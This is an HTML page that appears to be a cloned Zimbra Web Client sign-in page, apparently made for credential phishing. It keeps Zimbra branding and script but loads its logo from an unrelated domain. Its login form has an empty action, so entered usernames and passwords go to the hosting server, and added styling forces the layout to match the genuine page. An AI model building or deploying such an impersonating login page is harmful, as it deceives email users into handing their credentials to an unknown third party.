<!DOCTYPE html>
<html lang="en">
<head>
	<base href="https://mail.zimbra.com/" />
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
	<title>Zimbra Web Client Sign In</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com."/>
	<meta name="apple-mobile-web-app-capable" content="yes"/>
	<meta name="apple-mobile-web-app-status-bar-style" content="black"/>
	<link href="/css/common,login,zhtml,skin.css?skin=harmony&amp;v=251013124436" rel="stylesheet" type="text/css" />
	<link href="/img/logo/favicon.ico" rel="SHORTCUT ICON" />
	<style>
		.signIn img {
			max-width: 400px;
			height: auto;
			width: auto;
			display: block;
		}
		
		/* Optional: Add subtle shadow */
		.signIn img {
			filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
		}
		
		/* Ensure form is centered and sized */
		.form {
			width: 100%;
			max-width: 400px;
			height: 296px;
			margin: 0 auto;
			overflow: hidden;
			display: flex;
			flex-direction: column;
			box-sizing: border-box;
		}
			
		/* MAIN: Override modernContentBox with exact size 480x386 */
		.LoginScreen .modernContentBox {
			box-shadow: 0 4px 6px 0 rgba(0,0,0,.4) !important;
			padding: 40px !important;
			width: 480px !important;
			height: 386px !important;
			max-width: 480px !important;
			min-width: 480px !important;
			min-height: 386px !important;
			margin: 0 auto !important;
			position: relative;
			top: 50%;
			transform: translateY(-50%);
			display: flex;
			flex-direction: column;
			justify-content: center;
			align-items: center;
			text-align: center;
			box-sizing: border-box !important;
		}
	</style>
	<script>
		window.addEventListener('load', function() {
			var modernBox = document.querySelector('.LoginScreen .modernContentBox');
			if (modernBox) {
				modernBox.style.width = '480px';
				modernBox.style.height = '386px';
				modernBox.style.maxWidth = '480px';
				modernBox.style.minWidth = '480px';
				modernBox.style.minHeight = '386px';
				console.log('Set modernContentBox to 480x386px');
			}
			
			// Force set form dimensions
			var formDiv = document.querySelector('.form');
			if (formDiv) {
				formDiv.style.width = '400px';
				formDiv.style.height = '296px';
				formDiv.style.maxWidth = '400px';
				formDiv.style.minWidth = '400px';
				formDiv.style.minHeight = '296px';
				console.log('Set form to 400x296px');
			}
		});
	</script>
</head>
<body onload="onLoad();">
<div class="LoginScreen" id="modifiedLogin">
<div class="modernCenter">
<div class="modernContentBox" style="background-color: transparent;">
<div class="logo"><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span> </a></div>
<div class="signIn">
	<img alt="Company Logo" src="https://image.ryandevsite.online/images/zimbraSkinLogoURL.png" />
</div>

<form accept-charset="UTF-8" action="" id="zLoginForm" method="post" name="loginForm">
	<input name="__original_url" type="hidden" value="https://mail.zimbra.com//" />
	<input name="loginOp" type="hidden" value="login" />
	<input name="login_csrf" type="hidden" value="cc3b4068-5f21-428c-8f40-1a04361e3ed3" />

	<div class="form">
		<div class="errorMessage" id="errorMessageDiv">&nbsp;</div>

		<div class="loginSection">
			<label class="zLoginFieldLabel" for="username">Username</label>
			<input autocapitalize="off" autocorrect="off" class="zLoginFieldInput" id="username" maxlength="1024" name="username" size="40" tabindex="1" type="text" value="" />
			
			<label class="zLoginFieldLabel" for="password">Password</label>
			<div class="passwordWrapper">
				<input autocomplete="off" class="zLoginFieldInput" id="password" maxlength="1024" name="password" size="40" tabindex="2" type="password" value="" />
				<span id="showSpan" onclick="showPassword();" style="display: block;" toggle="#password">Show</span>
				<span id="hideSpan" onclick="showPassword();" style="display: none;" toggle="#password">Hide</span>
			</div>

			<div class="signInAndLabel">
				<div><button class="loginButton" id="loginButton" tabindex="5" type="submit">Sign In</button></div>
				<div class="rememberCheckWrapper">
					<input id="remember" name="zrememberme" tabindex="6" type="checkbox" value="1" />
					<label for="remember" id="remember">Stay signed in</label>
				</div>
			</div>
		</div>

		<div><hr /></div>

		<div>
			<div class="versionBlock" style="background-color: transparent;">
				<label for="client">Web App Version</label>
				<div style="position: relative;">
					<select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
						<option selected="selected" value="preferred">Default</option>
						<option value="advanced">Classic</option>
						<option value="modern">Modern</option>
					</select>
					<input class="alignWhatsThis" id="ZLoginWhatsThisButton" onclick="showTooltip();" type="button" />
				</div>

				<div id="ZLoginWhatsThis">
					<div class="ZLoginInfo">
						<span id="dialogCloseButton" onclick="hideTooltip();">&times;</span>
						<p><strong>Modern</strong><br />The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p>
						<p><strong>Classic</strong><br />The Classic Web App is familiar to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p>
						<p><strong>Default</strong><br />This will sign you in according to your saved Preference. In the Modern Web App, set this preference in Settings &gt; General &gt; Zimbra Version. In Classic, set it in Preferences &gt; General &gt; Sign In.</p>
					</div>
				</div>
			</div>
		</div>
	</div>
</form>
</div>

<div class="decor1">&nbsp;</div>
</div>

<div class="Footer">
<div class="legalNotice-small" id="ZLoginNotice">Copyright &copy; 2005-2025 Synacor, Inc. All rights reserved. &quot;Zimbra&quot; is a registered trademark of Synacor, Inc.</div>
</div>

<div class="decor2">&nbsp;</div>
</div>

<script>
function ZmSkin(e){
	this.hints=this.mergeObjects(ZmSkin.hints,e)
}
ZmSkin.hints={
	name:"harmony",version:"1",skin:{
		containers:"skin_outer"}
	,banner:{
		position:"static",url:"http://www.zimbra.com"}
	,favicon:{
		dir:""}
	,userInfo:{
		position:"static"}
	,search:{
		position:"static"}
	,quota:{
		position:"static"}
	,presence:{
		width:"40px",height:"24px"}
	,appView:{
		position:"static"}
	,searchResultsToolbar:{
		containers:["skin_tr_search_results_toolbar"]}
	,newButton:{
		containers:["skin_td_new_button"]}
	,tree:{
		minWidth:"13.5rem",maxWidth:"84rem",containers:["skin_td_tree","skin_td_tree_app_sash"],resizeContainers:["skin_td_tree","skin_container_app_new_button"]}
	,topToolbar:{
		containers:"skin_spacing_app_top_toolbar"}
	,treeFooter:{
		containers:"skin_tr_tree_footer"}
	,topAd:{
		containers:"skin_tr_top_ad"}
	,sidebarAd:{
		containers:"skin_td_sidebar_ad"}
	,bottomAd:{
		containers:"skin_tr_bottom_ad"}
	,treeTopAd:{
		containers:"skin_tr_tree_top_ad"}
	,treeBottomAd:{
		containers:"skin_tr_tree_bottom_ad"}
	,helpButton:{
		style:"link",container:"quota",url:""}
	,logoutButton:{
		style:"link",container:"quota"}
	,appChooser:{
		position:"static",direction:"LR"}
	,toast:{
		location:"N",transitions:[{
			type:"fade-in",step:5,duration:50}
		,{
			type:"pause",duration:5000}
		,{
			type:"fade-out",step:-10,duration:500}
		]}
	,fullScreen:{
		containers:["!skin_td_tree","!skin_td_tree_app_sash"]}
	,allAds:{
		containers:["skin_tr_top_ad","skin_td_sidebar_ad","skin_tr_bottom_ad","skin_tr_tree_top_ad","skin_tr_tree_bottom_ad"]}
	,hideSearchInCompose:true,notificationBanner:"/skins/_base/logos/NotificationBanner_grey.gif?v=251013124436"};
window.BaseSkin=ZmSkin;
ZmSkin.prototype={
	show:function(t,e,l){
		var a=this.hints[t]&&this.hints[t].containers;
		if(a){
			if(typeof a=="function"){
				a.apply(this,[e!=false]);
				skin._reflowApp();
				return
			}
			if(typeof a=="string"){
				a=[a]
			}
			var s=false;
			for(var r=0;
			r<a.length;
			r++){
				var h=a[r];
				var o=h.replace(/^!/,"");
				var n=h!=o;
				if(this._showEl(o,n?!e:e)){
					s=true
				}}
			if(s&&!l){
				skin._reflowApp()
			}}}
	,hide:function(e,t){
		this.show(e,false,t)
	}
	,gotoApp:function(e,t){
		appCtxt.getAppController().activateApp(e,null,t)
	}
	,gotoPrefs:function(e){
		if(appCtxt.getCurrentAppName()!=ZmApp.PREFERENCES){
			var t=new AjxCallback(this,this._gotoPrefPage,[e]);
			this.gotoApp(ZmApp.PREFERENCES,t)
		}else{
			this._gotoPrefPage(e)
		}}
	,mergeObjects:function(e,o){
		if(e==null){
			e={}
		}
		for(var a=1;
		a<arguments.length;
		a++){
			var n=arguments[a];
			for(var t in n){
				var s=e[t];
				if(typeof s=="object"&&!(s instanceof Array)){
					this.mergeObjects(e[t],n[t]);
					continue
				}
				if(!e[t]){
					e[t]=n[t]
				}}}
		return e
	}
	,getTreeWidth:function(){
		return Dwt.getSize(this._getEl(this.hints.tree.containers[0])).x
	}
	,setTreeWidth:function(e){
		this._setContainerSizes("tree",e,null)
	}
	,showTopAd:function(e){
		if(skin._showEl("skin_tr_top_ad",e)){
			skin._reflowApp()
		}}
	,hideTopAd:function(){
		skin.showTopAd(false)
	}
	,getTopAdContainer:function(){
		return skin._getEl("skin_container_top_ad")
	}
	,showSidebarAd:function(e){
		var t="skin_td_sidebar_ad";
		if(e!=null){
			Dwt.setSize(t,e)
		}
		if(skin._showEl(t)){
			skin._reflowApp()
		}}
	,hideSidebarAd:function(){
		var e="skin_td_sidebar_ad";
		if(skin._hideEl(e)){
			skin._reflowApp()
		}}
	,getSidebarAdContainer:function(){
		return this._getEl("skin_container_sidebar_ad")
	}
	,handleNotification:function(t,e){}
	,_getEl:function(e){
		return(typeof e=="string"?document.getElementById(e):e)
	}
	,_showEl:function(o,i){
		var t=this._getEl(o);
		if(!t){
			return
		}
		var a;
		if(i==false){
			a="none"
		}else{
			var e=t.tagName;
			if(e=="TD"){
				a="table-cell"
			}else{
				if(e=="TR"){
					a="table-row"
				}else{
					a="block"
				}}}
		if(a!=t.style.display){
			t.style.display=a;
			return true
		}else{
			return false
		}}
	,_hideEl:function(e){
		return this._showEl(e,false)
	}
	,_reparentEl:function(i,e){
		var a=this._getEl(e);
		var t=a&&this._getEl(i);
		if(t){
			a.appendChild(t)
		}}
	,_setContainerSizes:function(n,a,e){
		var o=this.hints[n].resizeContainers||this.hints[n].containers;
		for(var t=0;
		t<o.length;
		t++){
			Dwt.setSize(o[t],a,null)
		}}
	,_reflowApp:function(){
		if(window._zimbraMail){
			window._zimbraMail.getAppViewMgr().fitAll()
		}}
	,_gotoPrefPage:function(a){
		if(a==null){
			return
		}
		var i=appCtxt.getApp(ZmApp.PREFERENCES);
		var t=i.getPrefController();
		var e=t.getPrefsView();
		e.selectSection(a)
	}};
window.skin=new ZmSkin();
var link = getElement("bannerLink");
if (link) {
	link.href = skin.hints.banner.url;
}

function getElement(id) {
	return document.getElementById(id);
}

function updateTFAVerifyButtonStatus(input) {
	var button = getElement('verifyButton');
	if (input && input.value) {
		button.disabled = false;
	} else {
		button.disabled = true;
	}
}

function onLoad() {
	var loginForm = document.loginForm;
	if (loginForm.username) {
		if (loginForm.username.value != "") {
			loginForm.password.focus();
		}
		else {
			loginForm.username.focus();
		}
	}
	clientChange("preferred");
	if (false && loginForm.totpcode) {
		loginForm.totpcode.focus();
		updateTFAVerifyButtonStatus();
	}
}

function clientChange(selectValue) {
	var div = getElement("ZLoginUnsupported");
	if (div) {
		div.style.display = 'none';
	}
}

function forgotPassword() {
	var accountInput = getElement("username").value;
	var queryParams = encodeURI("account=" + accountInput);
	var url = "/public/PasswordRecovery.jsp?" + location.search;

	if (accountInput !== '') {
		url += (location.search !== '' ? '&' : '') + encodeURI("account=" + accountInput);
	}

	window.location.href = url;
}

function hideTooltip() {
	getElement('ZLoginWhatsThis').style.display='none';
}
function showTooltip(){
	getElement('ZLoginWhatsThis').style.display="block"
}

function showPassword() {
	showHidePasswordFields(getElement("password"), getElement("showSpan"), getElement("hideSpan"))
}
function showNewPassword() {
	showHidePasswordFields(getElement("newPassword"), getElement("newPasswordShowSpan"), getElement("newPasswordHideSpan"));
}
function showConfirmPassword() {
	showHidePasswordFields(getElement("confirm"), getElement("confirmShowSpan"), getElement("confirmHideSpan"));
}

function showHidePasswordFields(passElem, showSpanElem, hideSpanElem) {
	if (passElem.type === "password") {
		passElem.type = "text";
		showSpanElem.style.display = "none";
		hideSpanElem.style.display = "block";
	} else {
		passElem.type = "password";
		showSpanElem.style.display = "block";
		hideSpanElem.style.display = "none";
	}
}

var oldPasswordInput = getElement("password");
var newPasswordInput = getElement("newPassword");
var confirmPasswordInput = getElement("confirm");
var loginButton = getElement("loginButton");
var errorMessageDiv = getElement("errorMessageDiv");
var allRulesMatched = false;

if(newPasswordInput) {
	loginButton.disabled = true;
}

if("" === ""){
	errorMessageDiv.style.display = "none";
}

var enabledRules = [];
var supportedRules = [
	{
		type : "zimbraPasswordMinLength",
		checkImg : getElement("minLengthCheckImg"),
		closeImg : getElement("minLengthCloseImg")
	},
	{
		type : "zimbraPasswordMinUpperCaseChars",
		checkImg : getElement("minUpperCaseCheckImg"),
		closeImg : getElement("minUpperCaseCloseImg")
	},
	{
		type : "zimbraPasswordMinLowerCaseChars",
		checkImg : getElement("minLowerCaseCheckImg"),
		closeImg : getElement("minLowerCaseCloseImg")
	},
	{
		type : "zimbraPasswordMinNumericChars",
		checkImg : getElement("minNumericCharsCheckImg"),
		closeImg : getElement("minNumericCharsCloseImg")
	},
	{
		type : "zimbraPasswordMinPunctuationChars",
		checkImg : getElement("minPunctuationCharsCheckImg"),
		closeImg : getElement("minPunctuationCharsCloseImg")
	},
	{
		type : "zimbraPasswordMinDigitsOrPuncs",
		checkImg : getElement("minDigitsOrPuncsCheckImg"),
		closeImg : getElement("minDigitsOrPuncsCloseImg")
	},
	{
		type : "zimbraPasswordAllowUsername",
		checkImg : getElement("allowUsernameCheckImg"),
		closeImg : getElement("allowUsernameCloseImg")
	}
];

if (0){
	enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinLength"}));
}

if (0) {
	enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinUpperCaseChars"}));
}

if (0) {
	enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinLowerCaseChars"}));
}

if (0) {
	enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinNumericChars"}));
}

if (0) {
	enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinPunctuationChars"}));
}

if (0) {
	enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinDigitsOrPuncs"}));
}

if (false) {
	enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordAllowUsername"}));
}

function compareConfirmPass() {
	if (getElement("newPassword").value === getElement("confirm").value) {
		errorMessageDiv.style.display = "none";
		return true;
	} else {
		event.preventDefault();
		errorMessageDiv.style.display = "block";
		errorMessageDiv.innerHTML = "";
		return false;
	}
}

function check(checkImg, closeImg) {
	closeImg.style.display = "none";
	checkImg.style.display = "inline";
}
function unCheck(checkImg, closeImg) {
	closeImg.style.display = "inline";
	checkImg.style.display = "none";
}
function resetImg(condition, checkImg, closeImg){
	condition ? check(checkImg, closeImg) : unCheck(checkImg, closeImg);
}
function compareMatchedRules(matchedRule) {
	enabledRules.forEach(function(rule) {
		if (matchedRule.findIndex(function(mRule) { return mRule.type === rule.type}) >= 0) {
			check(rule.checkImg, rule.closeImg);
		} else {
			unCheck(rule.checkImg, rule.closeImg);
		}
	})
}

function setloginButtonDisabled(condition) {
	if (condition) {
		loginButton.disabled = true;
	} else {
		if (oldPasswordInput.value !== "") {
			loginButton.disabled = false;
		}
	}
}

function escapeXml(xmlString) {
	return xmlString.replace(/[<>&'"]/g, function (char) {
		switch (char) {
		case '<': return '&lt;';
		case '>': return '&gt;';
		case '&': return '&amp;';
		case "'": return '&apos;';
		case '"': return '&quot;';
		}
	});
}

function isAsciiPunc(ch) {
	return (ch >= 33 && ch <= 47) ||
	(ch >= 58 && ch <= 64) ||
	(ch >= 91 && ch <= 96) ||
	(ch >= 123 && ch <= 126);
}

function parseCharsFromPassword(passwordString) {
	const uppers = [],
		lowers = [],
		numbers = [],
		punctuations = [],
		invalidChars = [],
		invalidPuncs = [];

	const chars = passwordString.split('');

	chars.forEach(function (char) {
		const charCode = char.charCodeAt(0);
		let isInvalid = false;

		if ("") {
			try {
				if (!char.match(new RegExp("", 'g'))) {
					invalidChars.push(char);
					isInvalid = true;
				}
			} catch (error) {
				console.error(error);
			}
		}

		if (!isInvalid) {
			if (charCode >= 65 && charCode <= 90) {
				uppers.push(char);
			} else if (charCode >= 97 && charCode <= 122) {
				lowers.push(char);
			} else if (charCode >= 48 && charCode <= 57) {
				numbers.push(char);
			} else if ("") {
				try {
					char.match(new RegExp("", 'g'))
						? punctuations.push(char)
						: invalidPuncs.push(char);
				} catch (error) {
					console.error(error);
				}
			} else if (isAsciiPunc(charCode)) {
				punctuations.push(char);
			}
		}
	});

	return {
		uppers: uppers,
		lowers: lowers,
		numbers: numbers,
		punctuations: punctuations,
		invalidChars: invalidChars,
		invalidPuncs: invalidPuncs
	};
};

function handleNewPasswordChange() {
	var currentValue = newPasswordInput.value;
	var encodedPwd = escapeXml(currentValue);
	var parsedChars = parseCharsFromPassword(currentValue);
	var matchedRule = [];

	if (0){
		if (currentValue.length >= 0) {
			matchedRule.push({type : "zimbraPasswordMinLength"});
		}
	}

	if (0) {
		if (parsedChars.uppers.length >= 0) {
			matchedRule.push({type : "zimbraPasswordMinUpperCaseChars"});
		}
	}

	if (0) {
		if (parsedChars.lowers.length >= 0) {
			matchedRule.push({type : "zimbraPasswordMinLowerCaseChars"});
		}
	}

	if (0) {
		if (parsedChars.numbers.length >= 0) {
			matchedRule.push({type : "zimbraPasswordMinNumericChars"});
		}
	}

	if (0) {
		if (parsedChars.punctuations.length >= 0) {
			matchedRule.push({type : "zimbraPasswordMinPunctuationChars"});
		}
	}

	if (0) {
		if (parsedChars.punctuations.length + parsedChars.numbers.length >= 0) {
			matchedRule.push({type : "zimbraPasswordMinDigitsOrPuncs"});
		}
	}

	if (false) {
		if (!encodedPwd.includes("")) {
			matchedRule.push({type : "zimbraPasswordAllowUsername"});
		}
	}

	if(matchedRule.length >= enabledRules.length){
		allRulesMatched = true;
	} else {
		allRulesMatched = false;
	}

	compareMatchedRules(matchedRule);

	if (parsedChars.invalidChars.length > 0) {
		errorMessageDiv.style.display = "block";
		errorMessageDiv.innerHTML = parsedChars.invalidChars.join(", ") + " ";
	} else {
		errorMessageDiv.style.display = "none";
	}

	if(newPasswordInput.value !== "") {
		resetImg(confirmPasswordInput.value === newPasswordInput.value, getElement("mustMatchCheckImg"), getElement("mustMatchCloseImg"));
		setloginButtonDisabled(!allRulesMatched || confirmPasswordInput.value !== newPasswordInput.value);
	}
};

function handleConfirmPasswordChange() {
	resetImg(confirmPasswordInput.value === newPasswordInput.value, getElement("mustMatchCheckImg"), getElement("mustMatchCloseImg"));
	setloginButtonDisabled(!allRulesMatched || confirmPasswordInput.value !== newPasswordInput.value);
};

function handleOldPasswordChange() {
	setloginButtonDisabled(!allRulesMatched || newPasswordInput.value === "" || oldPasswordInput.value === "" || confirmPasswordInput.value !== newPasswordInput.value)
}

newPasswordInput && oldPasswordInput && oldPasswordInput.addEventListener("input", handleOldPasswordChange, null);
newPasswordInput && newPasswordInput.addEventListener("input", handleNewPasswordChange, null);
confirmPasswordInput && confirmPasswordInput.addEventListener("input", handleConfirmPasswordChange, null);
</script>
</body>
</html>
